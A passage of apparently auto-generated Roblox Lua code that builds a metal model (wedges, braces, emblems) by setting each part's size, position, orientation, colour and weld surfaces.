WedgePart169.Rotation = Vector3.new(90, 0, 179.98999)
WedgePart169.CanCollide = false
WedgePart169.FormFactor = Enum.FormFactor.Custom
WedgePart169.Size = Vector3.new(0.400000006, 0.400000006, 3)
WedgePart169.CFrame = CFrame.new(-25.7095623, 8.90049076, 31.2609272, -1, -0.00011542545, -1.16997289e-05, 1.24401122e-05, 1.74538945e-05, -0.999991715, 0.000130459724, -1.00000143, -2.79238375e-05)
WedgePart169.BackSurface = Enum.SurfaceType.Weld
WedgePart169.BottomSurface = Enum.SurfaceType.Weld
WedgePart169.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart169.Position = Vector3.new(-25.7095623, 8.90049076, 31.2609272)
WedgePart169.Orientation = Vector3.new(89.7699966, -157.269989, 35.4799995)
WedgePart169.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh170.Parent = WedgePart169
SpecialMesh170.MeshType = Enum.MeshType.Wedge
WedgePart171.Parent = Model0
WedgePart171.Material = Enum.Material.Metal
WedgePart171.BrickColor = BrickColor.new("Grime")
WedgePart171.Rotation = Vector3.new(90, 0, 180)
WedgePart171.CanCollide = false
WedgePart171.FormFactor = Enum.FormFactor.Custom
WedgePart171.Size = Vector3.new(0.400000006, 1.20000005, 0.999999821)
WedgePart171.CFrame = CFrame.new(-25.7096157, 7.90141249, 35.2606316, -1, -4.28536587e-05, -1.1318748e-05, 1.20651166e-05, -9.25489076e-05, -0.999991715, 5.78865729e-05, -1.00000143, 8.20791174e-05)
WedgePart171.BackSurface = Enum.SurfaceType.Weld
WedgePart171.BottomSurface = Enum.SurfaceType.Weld
WedgePart171.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart171.Position = Vector3.new(-25.7096157, 7.90141249, 35.2606316)
WedgePart171.Orientation = Vector3.new(89.7699966, -7.8499999, 172.569992)
WedgePart171.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh172.Parent = WedgePart171
SpecialMesh172.MeshType = Enum.MeshType.Wedge
WedgePart173.Parent = Model0
WedgePart173.Material = Enum.Material.Metal
WedgePart173.BrickColor = BrickColor.new("Grime")
WedgePart173.Rotation = Vector3.new(-90, 0, -180)
WedgePart173.CanCollide = false
WedgePart173.FormFactor = Enum.FormFactor.Custom
WedgePart173.Size = Vector3.new(0.400000006, 0.200000003, 2.60000014)
WedgePart173.CFrame = CFrame.new(-25.7096691, 8.70045567, 31.560833, -1, 8.70646472e-05, 1.34475977e-05, 1.41952787e-05, 6.08148293e-05, 0.999991715, 0.000102097867, 1.00000143, -5.03454758e-05)
WedgePart173.BackSurface = Enum.SurfaceType.Weld
WedgePart173.BottomSurface = Enum.SurfaceType.Weld
WedgePart173.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart173.Position = Vector3.new(-25.7096691, 8.70045567, 31.560833)
WedgePart173.Orientation = Vector3.new(-89.7699966, 165.050003, 13.1399994)
WedgePart173.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh174.Parent = WedgePart173
SpecialMesh174.MeshType = Enum.MeshType.Wedge
WedgePart175.Parent = Model0
WedgePart175.Material = Enum.Material.Metal
WedgePart175.BrickColor = BrickColor.new("Grime")
WedgePart175.Rotation = Vector3.new(90, 0, -0.00999999978)
WedgePart175.CanCollide = false
WedgePart175.FormFactor = Enum.FormFactor.Custom
WedgePart175.Size = Vector3.new(0.400000006, 0.400000006, 3)
WedgePart175.CFrame = CFrame.new(-25.7104053, 8.90147972, 46.4605446, 1, 9.32686453e-05, -1.07004098e-05, -1.14709874e-05, 3.40783699e-05, -1, -0.000108721877, 1, 2.31999766e-05)
WedgePart175.BackSurface = Enum.SurfaceType.Weld
WedgePart175.BottomSurface = Enum.SurfaceType.Weld
WedgePart175.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart175.Position = Vector3.new(-25.7104053, 8.90147972, 46.4605446)
WedgePart175.Orientation = Vector3.new(90, 0.00999999978, 0)
WedgePart175.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh176.Parent = WedgePart175
SpecialMesh176.MeshType = Enum.MeshType.Wedge
WedgePart177.Parent = Model0
WedgePart177.Material = Enum.Material.Metal
WedgePart177.BrickColor = BrickColor.new("Grime")
WedgePart177.Rotation = Vector3.new(90, 0, 180)
WedgePart177.CanCollide = false
WedgePart177.FormFactor = Enum.FormFactor.Custom
WedgePart177.Size = Vector3.new(11.8000002, 0.400000006, 2.79999995)
WedgePart177.CFrame = CFrame.new(-10.8100128, 8.80036926, 31.4599285, -1, -1.98704856e-05, -7.10724089e-06, 7.16815839e-06, 1.53286351e-06, -0.99999088, 2.11030638e-05, -1.00000012, -2.38569896e-06)
WedgePart177.BackSurface = Enum.SurfaceType.Weld
WedgePart177.BottomSurface = Enum.SurfaceType.Weld
WedgePart177.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart177.Position = Vector3.new(-10.8100128, 8.80036926, 31.4599285)
WedgePart177.Orientation = Vector3.new(89.7599945, -108.559998, 77.9300003)
WedgePart177.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh178.Parent = WedgePart177
SpecialMesh178.MeshType = Enum.MeshType.Wedge
WedgePart179.Parent = Model0
WedgePart179.Material = Enum.Material.Metal
WedgePart179.BrickColor = BrickColor.new("Grime")
WedgePart179.Rotation = Vector3.new(-90, 0, -180)
WedgePart179.CanCollide = false
WedgePart179.FormFactor = Enum.FormFactor.Custom
WedgePart179.Size = Vector3.new(0.200000003, 0.200000003, 2.60000014)
WedgePart179.CFrame = CFrame.new(-16.8098984, 8.70064831, 31.5546684, -1, 3.86261199e-05, 8.03524836e-06, 8.7385406e-06, 3.54923986e-06, 0.999991119, 5.28609926e-05, 1.00000048, 6.47919069e-06)
WedgePart179.BackSurface = Enum.SurfaceType.Weld
WedgePart179.BottomSurface = Enum.SurfaceType.Weld
WedgePart179.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart179.Position = Vector3.new(-16.8098984, 8.70064831, 31.5546684)
WedgePart179.Orientation = Vector3.new(-89.7599945, 51.1199989, 67.9000015)
WedgePart179.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh180.Parent = WedgePart179
SpecialMesh180.MeshType = Enum.MeshType.Wedge
WedgePart181.Parent = Model0
WedgePart181.Material = Enum.Material.Metal
WedgePart181.BrickColor = BrickColor.new("Grime")
WedgePart181.Rotation = Vector3.new(90, 0, 180)
WedgePart181.CanCollide = false
WedgePart181.FormFactor = Enum.FormFactor.Custom
WedgePart181.Size = Vector3.new(0.200000003, 0.400000006, 3)
WedgePart181.CFrame = CFrame.new(-19.6100655, 8.90089989, 31.2546997, -1, -6.24609311e-05, -9.12487758e-06, 9.82918027e-06, -1.84945038e-05, -0.99999088, 7.66956946e-05, -1.00000012, 8.43711314e-06)
WedgePart181.BackSurface = Enum.SurfaceType.Weld
WedgePart181.BottomSurface = Enum.SurfaceType.Weld
WedgePart181.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart181.Position = Vector3.new(-19.6100655, 8.90089989, 31.2546997)
WedgePart181.Orientation = Vector3.new(89.7599945, -47.2399979, 152.009995)
WedgePart181.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh182.Parent = WedgePart181
SpecialMesh182.MeshType = Enum.MeshType.Wedge
WedgePart183.Parent = Model0
WedgePart183.Material = Enum.Material.Metal
WedgePart183.BrickColor = BrickColor.new("Grime")
WedgePart183.Rotation = Vector3.new(90, 0, 180)
WedgePart183.CanCollide = false
WedgePart183.FormFactor = Enum.FormFactor.Custom
WedgePart183.Size = Vector3.new(0.400000006, 0.400000006, 3)
WedgePart183.CFrame = CFrame.new(-22.7099266, 8.90095329, 31.255022, -1, -6.28153575e-05, -9.15679993e-06, 9.860717e-06, -1.23528207e-05, -0.999991715, 7.70501429e-05, -1.00000143, 2.44396688e-06)
WedgePart183.BackSurface = Enum.SurfaceType.Weld
WedgePart183.BottomSurface = Enum.SurfaceType.Weld
WedgePart183.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart183.Position = Vector3.new(-22.7099266, 8.90095329, 31.255022)
WedgePart183.Orientation = Vector3.new(89.7699966, -75.0599976, 141.399994)
WedgePart183.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh184.Parent = WedgePart183
SpecialMesh184.MeshType = Enum.MeshType.Wedge
WedgePart185.Parent = Model0
WedgePart185.Material = Enum.Material.Metal
WedgePart185.BrickColor = BrickColor.new("Grime")
WedgePart185.Rotation = Vector3.new(-90, 0, 0)
WedgePart185.CanCollide = false
WedgePart185.FormFactor = Enum.FormFactor.Custom
WedgePart185.Size = Vector3.new(0.400000006, 0.200000003, 2.60000014)
WedgePart185.CFrame = CFrame.new(-25.7090588, 8.70090199, 46.1605759, 1, -7.75331137e-05, 9.84157032e-06, -1.01347641e-05, 5.37735141e-05, 1, -8.35282772e-05, -1, 5.7992067e-05)
WedgePart185.BackSurface = Enum.SurfaceType.Weld
WedgePart185.BottomSurface = Enum.SurfaceType.Weld
WedgePart185.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart185.Position = Vector3.new(-25.7090588, 8.70090199, 46.1605759)
WedgePart185.Orientation = Vector3.new(-90, 0, 0)
WedgePart185.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh186.Parent = WedgePart185
SpecialMesh186.MeshType = Enum.MeshType.Wedge
WedgePart187.Parent = Model0
WedgePart187.Material = Enum.Material.Metal
WedgePart187.BrickColor = BrickColor.new("Grime")
WedgePart187.Rotation = Vector3.new(-90, 0, -180)
WedgePart187.CanCollide = false
WedgePart187.FormFactor = Enum.FormFactor.Custom
WedgePart187.Size = Vector3.new(0.200000003, 0.200000003, 2.60000014)
WedgePart187.CFrame = CFrame.new(-19.6096992, 8.70069408, 31.5548515, -1, 2.96698472e-05, 7.61610727e-06, 8.31959642e-06, 1.10488836e-05, 0.99999088, 4.39046744e-05, 1.00000012, -9.91035904e-07)
WedgePart187.BackSurface = Enum.SurfaceType.Weld
WedgePart187.BottomSurface = Enum.SurfaceType.Weld
WedgePart187.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart187.Position = Vector3.new(-19.6096992, 8.70069408, 31.5548515)
WedgePart187.Orientation = Vector3.new(-89.7599945, 97.409996, 36.9799995)
WedgePart187.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh188.Parent = WedgePart187
SpecialMesh188.MeshType = Enum.MeshType.Wedge
WedgePart189.Parent = Model0
WedgePart189.Material = Enum.Material.Metal
WedgePart189.BrickColor = BrickColor.new("Grime")
WedgePart189.Rotation = Vector3.new(-90, 0, -180)
WedgePart189.CanCollide = false
WedgePart189.FormFactor = Enum.FormFactor.Custom
WedgePart189.Size = Vector3.new(0.400000006, 0.200000003, 2.60000014)
WedgePart189.CFrame = CFrame.new(-22.7095509, 8.70071697, 31.5549793, -1, 2.9757899e-05, 7.61660112e-06, 8.32005298e-06, 1.00073721e-05, 0.999991715, 4.39926589e-05, 1.00000143, -9.81024186e-08)
WedgePart189.BackSurface = Enum.SurfaceType.Weld
WedgePart189.BottomSurface = Enum.SurfaceType.Weld
WedgePart189.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart189.Position = Vector3.new(-22.7095509, 8.70071697, 31.5549793)
WedgePart189.Orientation = Vector3.new(-89.7699966, 90.7399979, 39.7399979)
WedgePart189.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh190.Parent = WedgePart189
SpecialMesh190.MeshType = Enum.MeshType.Wedge
WedgePart191.Parent = Model0
WedgePart191.Material = Enum.Material.Metal
WedgePart191.BrickColor = BrickColor.new("Grime")
WedgePart191.Rotation = Vector3.new(90, 0, 180)
WedgePart191.CanCollide = false
WedgePart191.FormFactor = Enum.FormFactor.Custom
WedgePart191.Size = Vector3.new(0.200000003, 0.400000006, 3)
WedgePart191.CFrame = CFrame.new(-16.810257, 8.90075588, 31.25453, -1, -6.24630338e-05, -9.1277625e-06, 9.83149221e-06, -9.34280797e-06, -0.999991119, 7.66978701e-05, -1.00000048, -6.85276063e-07)
WedgePart191.BackSurface = Enum.SurfaceType.Weld
WedgePart191.BottomSurface = Enum.SurfaceType.Weld
WedgePart191.Color = Color3.new(0.498039, 0.556863, 0.392157)
WedgePart191.Position = Vector3.new(-16.810257, 8.90075588, 31.25453)
WedgePart191.Orientation = Vector3.new(89.7599945, -94.2900009, 133.539993)
WedgePart191.Color = Color3.new(0.498039, 0.556863, 0.392157)
SpecialMesh192.Parent = WedgePart191
SpecialMesh192.MeshType = Enum.MeshType.Wedge
Model193.Name = "Braces"
Model193.Parent = Model0
Part194.Name = "SideSupporters"
Part194.Parent = Model193
Part194.Material = Enum.Material.DiamondPlate
Part194.BrickColor = BrickColor.new("Dark stone grey")
Part194.Rotation = Vector3.new(-0.00999999978, -0.00999999978, -90)
Part194.CanCollide = false
Part194.FormFactor = Enum.FormFactor.Custom
Part194.Size = Vector3.new(0.800000012, 38.6000023, 0.599999905)
Part194.CFrame = CFrame.new(4.88875008, 11.701334, 42.4607582, -1.26398409e-05, 1, -0.000139337557, -1, -1.35639984e-05, 0.000109516797, 9.60821344e-05, 0.000120227873, 1)
Part194.BackSurface = Enum.SurfaceType.Weld
Part194.BottomSurface = Enum.SurfaceType.Weld
Part194.FrontSurface = Enum.SurfaceType.Weld
Part194.LeftSurface = Enum.SurfaceType.Weld
Part194.RightSurface = Enum.SurfaceType.Weld
Part194.TopSurface = Enum.SurfaceType.Weld
Part194.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part194.Position = Vector3.new(4.88875008, 11.701334, 42.4607582)
Part194.Orientation = Vector3.new(-0.00999999978, -0.00999999978, -90)
Part194.Color = Color3.new(0.388235, 0.372549, 0.384314)
CylinderMesh195.Parent = Part194
CylinderMesh195.Offset = Vector3.new(0.699999988, 0, -0.5)
Part196.Name = "SideSupporters"
Part196.Parent = Model193
Part196.Material = Enum.Material.DiamondPlate
Part196.BrickColor = BrickColor.new("Dark stone grey")
Part196.Rotation = Vector3.new(0, 0, -90)
Part196.CanCollide = false
Part196.FormFactor = Enum.FormFactor.Custom
Part196.Size = Vector3.new(0.800000012, 38.6000023, 0.599999905)
Part196.CFrame = CFrame.new(4.89028549, 11.7001047, 35.459919, -3.96238374e-06, 1, -1.33412796e-05, -1, -4.90152115e-06, 2.09537357e-05, 7.52074175e-06, -5.76958473e-06, 1)
Part196.BackSurface = Enum.SurfaceType.Weld
Part196.BottomSurface = Enum.SurfaceType.Weld
Part196.FrontSurface = Enum.SurfaceType.Weld
Part196.LeftSurface = Enum.SurfaceType.Weld
Part196.RightSurface = Enum.SurfaceType.Weld
Part196.TopSurface = Enum.SurfaceType.Weld
Part196.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part196.Position = Vector3.new(4.89028549, 11.7001047, 35.459919)
Part196.Orientation = Vector3.new(0, 0, -90)
Part196.Color = Color3.new(0.388235, 0.372549, 0.384314)
CylinderMesh197.Parent = Part196
CylinderMesh197.Offset = Vector3.new(0.699999988, 0, 0.5)
Part198.Name = "SideSupporters"
Part198.Parent = Model193
Part198.Material = Enum.Material.DiamondPlate
Part198.BrickColor = BrickColor.new("Dark stone grey")
Part198.Transparency = 1
Part198.Rotation = Vector3.new(-90, 90, 0)
Part198.CanCollide = false
Part198.FormFactor = Enum.FormFactor.Custom
Part198.Size = Vector3.new(0.399999976, 3.200001, 0.599999905)
Part198.CFrame = CFrame.new(12.6886978, 12.3010302, 41.0611801, -1.00123516e-05, 0.000133011898, 1, -1, -8.2736733e-05, -1.09407647e-05, 6.93024485e-05, -1, 0.000113901697)
Part198.BackSurface = Enum.SurfaceType.Weld
Part198.BottomSurface = Enum.SurfaceType.Weld
Part198.FrontSurface = Enum.SurfaceType.Weld
Part198.LeftSurface = Enum.SurfaceType.Weld
Part198.RightSurface = Enum.SurfaceType.Weld
Part198.TopSurface = Enum.SurfaceType.Weld
Part198.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part198.Position = Vector3.new(12.6886978, 12.3010302, 41.0611801)
Part198.Orientation = Vector3.new(0, 89.9899979, -90)
Part198.Color = Color3.new(0.388235, 0.372549, 0.384314)
CylinderMesh199.Parent = Part198
CylinderMesh199.Offset = Vector3.new(0.699999988, 0, 0.5)
Part200.Name = "SideSupporters"
Part200.Parent = Model193
Part200.Material = Enum.Material.DiamondPlate
Part200.BrickColor = BrickColor.new("Dark stone grey")
Part200.Transparency = 1
Part200.Rotation = Vector3.new(-90, 90, 0)
Part200.CanCollide = false
Part200.FormFactor = Enum.FormFactor.Custom
Part200.Size = Vector3.new(0.399999976, 3.200001, 0.599999905)
Part200.CFrame = CFrame.new(12.6900082, 12.3000383, 36.8591309, -2.95247196e-06, -2.58682812e-05, 1, -1, 2.89400232e-05, -3.89114075e-06, -4.23728707e-05, -1, -4.49793006e-05)
Part200.BackSurface = Enum.SurfaceType.Weld
Part200.BottomSurface = Enum.SurfaceType.Weld
Part200.FrontSurface = Enum.SurfaceType.Weld
Part200.LeftSurface = Enum.SurfaceType.Weld
Part200.RightSurface = Enum.SurfaceType.Weld
Part200.TopSurface = Enum.SurfaceType.Weld
Part200.Color = Color3.new(0.388235, 0.372549, 0.384314)
Part200.Position = Vector3.new(12.6900082, 12.3000383, 36.8591309)
Part200.Orientation = Vector3.new(0, 90, -90)
Part200.Color = Color3.new(0.388235, 0.372549, 0.384314)
CylinderMesh201.Parent = Part200
CylinderMesh201.Offset = Vector3.new(0.699999988, 0, 0.5)
Part202.Name = "Emblem"
Part202.Parent = Model0
Part202.Material = Enum.Material.Metal
Part202.BrickColor = BrickColor.new("Grime")
Part202.CanCollide = false
Part202.FormFactor = Enum.FormFactor.Custom
Part202.Size = Vector3.new(3.60000014, 3.39999962, 0.200000003)
Part202.CFrame = CFrame.new(-20.5100327, 5.70076609, 30.9600067, 1, 7.46798696e-06, 2.7385162e-05, -7.62826676e-06, 0.999991715, -1.72890504e-05, -3.06962465e-05, 1.95087814e-05, 1.00000143)
Part202.BackSurface = Enum.SurfaceType.Weld
Part202.BottomSurface = Enum.SurfaceType.Weld
Part202.FrontSurface = Enum.SurfaceType.Weld
Part202.LeftSurface = Enum.SurfaceType.Weld
Part202.RightSurface = Enum.SurfaceType.Weld
Part202.TopSurface = Enum.SurfaceType.Weld
Part202.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part202.Position = Vector3.new(-20.5100327, 5.70076609, 30.9600067)
Part202.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh203.Parent = Part202
BlockMesh203.Offset = Vector3.new(0, 0, 0.200000003)
Part204.Parent = Model0
Part204.Material = Enum.Material.Metal
Part204.BrickColor = BrickColor.new("Grime")
Part204.Rotation = Vector3.new(-180, 0, -180)
Part204.FormFactor = Enum.FormFactor.Custom
Part204.Size = Vector3.new(6.19999933, 2.20000005, 2.60000038)
Part204.CFrame = CFrame.new(14.9899111, 9.90013885, 32.9597321, -1, 8.86935595e-06, -5.40786423e-05, 8.96597521e-06, 1, 8.80265179e-06, 5.60541885e-05, 1.01906853e-05, -1)
Part204.BackSurface = Enum.SurfaceType.Weld
Part204.BottomSurface = Enum.SurfaceType.Weld
Part204.FrontSurface = Enum.SurfaceType.Weld
Part204.LeftSurface = Enum.SurfaceType.Weld
Part204.RightSurface = Enum.SurfaceType.Weld
Part204.TopSurface = Enum.SurfaceType.Weld
Part204.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part204.Position = Vector3.new(14.9899111, 9.90013885, 32.9597321)
Part204.Orientation = Vector3.new(0, -180, 0)
Part204.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh205.Parent = Part204
Part206.Parent = Model0
Part206.Material = Enum.Material.Metal
Part206.BrickColor = BrickColor.new("Grime")
Part206.Rotation = Vector3.new(180, 0, -180)
Part206.FormFactor = Enum.FormFactor.Custom
Part206.Size = Vector3.new(5.19999933, 1.19999993, 4.00000048)
Part206.CFrame = CFrame.new(8.89008808, 8.60011578, 33.6598549, -1, 6.99085149e-06, -1.63561654e-05, 7.1075865e-06, 1, -6.3724741e-08, 1.87311598e-05, 1.60550485e-06, -1)
Part206.BackSurface = Enum.SurfaceType.Weld
Part206.BottomSurface = Enum.SurfaceType.Weld
Part206.FrontSurface = Enum.SurfaceType.Weld
Part206.LeftSurface = Enum.SurfaceType.Weld
Part206.RightSurface = Enum.SurfaceType.Weld
Part206.TopSurface = Enum.SurfaceType.Weld
Part206.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part206.Position = Vector3.new(8.89008808, 8.60011578, 33.6598549)
Part206.Orientation = Vector3.new(0, -180, 0)
Part206.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh207.Parent = Part206
Part208.Parent = Model0
Part208.Material = Enum.Material.Metal
Part208.BrickColor = BrickColor.new("Grime")
Part208.Rotation = Vector3.new(-180, 0, -180)
Part208.CanCollide = false
Part208.FormFactor = Enum.FormFactor.Custom
Part208.Size = Vector3.new(11.8000002, 4.19999981, 4.60000038)
Part208.CFrame = CFrame.new(-10.8099661, 8.10049725, 33.9599152, -1, 7.14305224e-06, -2.03425952e-05, 7.16210434e-06, 1, 1.88869399e-06, 2.07310459e-05, 2.16157287e-06, -1)
Part208.BackSurface = Enum.SurfaceType.Weld
Part208.BottomSurface = Enum.SurfaceType.Weld
Part208.FrontSurface = Enum.SurfaceType.Weld
Part208.LeftSurface = Enum.SurfaceType.Weld
Part208.RightSurface = Enum.SurfaceType.Weld
Part208.TopSurface = Enum.SurfaceType.Weld
Part208.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part208.Position = Vector3.new(-10.8099661, 8.10049725, 33.9599152)
Part208.Orientation = Vector3.new(0, -180, 0)
Part208.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh209.Parent = Part208
Part210.Name = "Emblem"
Part210.Parent = Model0
Part210.Material = Enum.Material.Metal
Part210.BrickColor = BrickColor.new("Grime")
Part210.Rotation = Vector3.new(-180, 0, -180)
Part210.CanCollide = false
Part210.FormFactor = Enum.FormFactor.Custom
Part210.Size = Vector3.new(3.60000014, 3.39999962, 0.200000003)
Part210.CFrame = CFrame.new(-20.5099678, 5.70037603, 46.760025, -1, 6.35870629e-06, -2.10810867e-06, 6.65713014e-06, 1, 1.4320929e-05, 8.12503458e-06, 1.85558729e-05, -1)
Part210.BackSurface = Enum.SurfaceType.Weld
Part210.BottomSurface = Enum.SurfaceType.Weld
Part210.FrontSurface = Enum.SurfaceType.Weld
Part210.LeftSurface = Enum.SurfaceType.Weld
Part210.RightSurface = Enum.SurfaceType.Weld
Part210.TopSurface = Enum.SurfaceType.Weld
Part210.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part210.Position = Vector3.new(-20.5099678, 5.70037603, 46.760025)
Part210.Orientation = Vector3.new(0, -180, 0)
Part210.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh211.Parent = Part210
BlockMesh211.Offset = Vector3.new(0, 0, 0.200000003)
Part212.Parent = Model0
Part212.Material = Enum.Material.Metal
Part212.BrickColor = BrickColor.new("Grime")
Part212.Rotation = Vector3.new(180, 0, -180)
Part212.CanCollide = false
Part212.FormFactor = Enum.FormFactor.Custom
Part212.Size = Vector3.new(3, 3, 5.19999981)
Part212.CFrame = CFrame.new(3.79019642, 8.70022011, 44.0599136, -1, 6.32772435e-06, -3.98295379e-06, 6.47945944e-06, 1, -8.76483864e-06, 7.04126296e-06, -6.61228023e-06, -1)
Part212.BackSurface = Enum.SurfaceType.Weld
Part212.BottomSurface = Enum.SurfaceType.Weld
Part212.FrontSurface = Enum.SurfaceType.Weld
Part212.LeftSurface = Enum.SurfaceType.Weld
Part212.RightSurface = Enum.SurfaceType.Weld
Part212.TopSurface = Enum.SurfaceType.Weld
Part212.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part212.Position = Vector3.new(3.79019642, 8.70022011, 44.0599136)
Part212.Orientation = Vector3.new(0, -180, 0)
Part212.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh213.Parent = Part212
Part214.Parent = Model0
Part214.Material = Enum.Material.Metal
Part214.BrickColor = BrickColor.new("Grime")
Part214.Rotation = Vector3.new(-180, 0, -180)
Part214.CanCollide = false
Part214.FormFactor = Enum.FormFactor.Custom
Part214.Size = Vector3.new(10.1999998, 0.999999881, 2.79999995)
Part214.CFrame = CFrame.new(0.190334558, 10.7001324, 43.6596947, -1, 8.83405392e-06, -5.33534985e-05, 9.60729267e-06, 0.99999088, 3.31501396e-05, 6.89792505e-05, 4.41338598e-05, -1.00000012)
Part214.BackSurface = Enum.SurfaceType.Weld
Part214.BottomSurface = Enum.SurfaceType.Weld
Part214.FrontSurface = Enum.SurfaceType.Weld
Part214.LeftSurface = Enum.SurfaceType.Weld
Part214.RightSurface = Enum.SurfaceType.Weld
Part214.TopSurface = Enum.SurfaceType.Weld
Part214.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part214.Position = Vector3.new(0.190334558, 10.7001324, 43.6596947)
Part214.Orientation = Vector3.new(0, -180, 0)
Part214.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh215.Parent = Part214
Part216.Parent = Model0
Part216.Material = Enum.Material.Metal
Part216.BrickColor = BrickColor.new("Grime")
Part216.Rotation = Vector3.new(180, 0, -180)
Part216.CanCollide = false
Part216.FormFactor = Enum.FormFactor.Custom
Part216.Size = Vector3.new(11.8000002, 0.399999976, 0.200000003)
Part216.CFrame = CFrame.new(-10.8095398, 6.20018864, 31.1600113, -1, 6.19986486e-06, -4.70125087e-07, 6.56853854e-06, 0.99999088, -1.11185163e-05, 7.90813283e-06, -5.89815954e-06, -1.00000012)
Part216.BackSurface = Enum.SurfaceType.Weld
Part216.BottomSurface = Enum.SurfaceType.Weld
Part216.FrontSurface = Enum.SurfaceType.Weld
Part216.LeftSurface = Enum.SurfaceType.Weld
Part216.RightSurface = Enum.SurfaceType.Weld
Part216.TopSurface = Enum.SurfaceType.Weld
Part216.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part216.Position = Vector3.new(-10.8095398, 6.20018864, 31.1600113)
Part216.Orientation = Vector3.new(0, -180, 0)
Part216.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh217.Parent = Part216
Part218.Parent = Model0
Part218.Material = Enum.Material.Metal
Part218.BrickColor = BrickColor.new("Grime")
Part218.Rotation = Vector3.new(-180, 0, -180)
Part218.CanCollide = false
Part218.FormFactor = Enum.FormFactor.Custom
Part218.Size = Vector3.new(11.8000002, 4.19999981, 4.60000038)
Part218.CFrame = CFrame.new(-10.8097363, 8.10028648, 43.7601395, -1, 7.16859677e-06, -2.04153348e-05, 7.45285433e-06, 1, 2.7828346e-06, 2.61436471e-05, 6.81482152e-06, -1)
Part218.BackSurface = Enum.SurfaceType.Weld
Part218.BottomSurface = Enum.SurfaceType.Weld
Part218.FrontSurface = Enum.SurfaceType.Weld
Part218.LeftSurface = Enum.SurfaceType.Weld
Part218.RightSurface = Enum.SurfaceType.Weld
Part218.TopSurface = Enum.SurfaceType.Weld
Part218.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part218.Position = Vector3.new(-10.8097363, 8.10028648, 43.7601395)
Part218.Orientation = Vector3.new(0, -180, 0)
Part218.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh219.Parent = Part218
Part220.Parent = Model0
Part220.Material = Enum.Material.Metal
Part220.BrickColor = BrickColor.new("Grime")
Part220.Rotation = Vector3.new(-180, 0, -180)
Part220.CanCollide = false
Part220.FormFactor = Enum.FormFactor.Custom
Part220.Size = Vector3.new(3, 3, 5.19999981)
Part220.CFrame = CFrame.new(3.79002571, 8.70051765, 33.6592712, -1, 8.50772994e-06, -4.85191158e-05, 8.51756067e-06, 1, 1.09945977e-05, 4.87300749e-05, 1.11423969e-05, -1)
Part220.BackSurface = Enum.SurfaceType.Weld
Part220.BottomSurface = Enum.SurfaceType.Weld
Part220.FrontSurface = Enum.SurfaceType.Weld
Part220.LeftSurface = Enum.SurfaceType.Weld
Part220.RightSurface = Enum.SurfaceType.Weld
Part220.TopSurface = Enum.SurfaceType.Weld
Part220.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part220.Position = Vector3.new(3.79002571, 8.70051765, 33.6592712)
Part220.Orientation = Vector3.new(0, -180, 0)
Part220.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh221.Parent = Part220
Part222.Parent = Model0
Part222.Material = Enum.Material.Metal
Part222.BrickColor = BrickColor.new("Grime")
Part222.Rotation = Vector3.new(180, 0, -180)
Part222.CanCollide = false
Part222.FormFactor = Enum.FormFactor.Custom
Part222.Size = Vector3.new(22, 0.799999714, 0.600000441)
Part222.CFrame = CFrame.new(-5.70979691, 8.60026169, 36.5600357, -1, 6.81412985e-06, -1.27640888e-05, 7.56088548e-06, 0.999981761, -9.83839709e-06, 2.78288353e-05, 7.34849891e-07, -1.00000024)
Part222.BackSurface = Enum.SurfaceType.Weld
Part222.BottomSurface = Enum.SurfaceType.Weld
Part222.FrontSurface = Enum.SurfaceType.Weld
Part222.LeftSurface = Enum.SurfaceType.Weld
Part222.RightSurface = Enum.SurfaceType.Weld
Part222.TopSurface = Enum.SurfaceType.Weld
Part222.Color = Color3.new(0.498039, 0.556863, 0.392157)
Part222.Position = Vector3.new(-5.70979691, 8.60026169, 36.5600357)
Part222.Orientation = Vector3.new(0, -180, 0)
Part222.Color = Color3.new(0.498039, 0.556863, 0.392157)
BlockMesh223.Parent = Part222
Part224.Parent = Model0
Part224.Material = Enum.Material.Metal
Part224.BrickColor = BrickColor.new("Grime")
Part224.Rotation = Vector3.new(180, 0, -180)
Part224.CanCollide = false
